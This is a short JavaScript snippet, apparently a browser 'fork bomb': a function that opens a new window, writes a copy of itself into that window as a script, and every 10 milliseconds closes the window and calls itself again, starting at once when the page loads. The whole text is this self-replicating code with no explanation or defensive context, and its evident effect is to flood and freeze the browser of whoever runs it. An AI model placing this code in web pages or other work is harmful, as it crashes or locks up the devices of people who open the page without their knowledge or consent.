
function fork() {
    const win = window.open();
    const script = win.document.createElement("script");
    script.innerHTML = fork + "\n" + "fork();";
    win.document.head.appendChild(script);
    setTimeout(function() {
      win.close();
      fork();
    }, 10)
  }
  
  fork();